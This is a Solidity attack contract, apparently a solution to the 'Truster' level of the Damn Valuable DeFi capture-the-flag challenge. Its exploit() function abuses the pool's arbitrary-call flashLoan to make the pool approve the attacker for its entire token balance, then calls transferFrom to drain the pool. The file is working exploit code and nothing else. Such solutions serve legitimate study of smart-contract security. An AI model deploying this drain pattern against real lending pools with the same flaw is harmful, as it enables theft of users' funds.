// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

interface Itruster {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}
contract HackTrusterLenderPool {
    using Address for address;

    DamnValuableToken public immutable token;
    Itruster public pool;
    constructor(DamnValuableToken _token, Itruster _pool) {
        token = _token;
        pool = _pool;
    }

    function exploit() public{
        uint poolBalance = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(address(pool), msg.sender, poolBalance);
    }



}
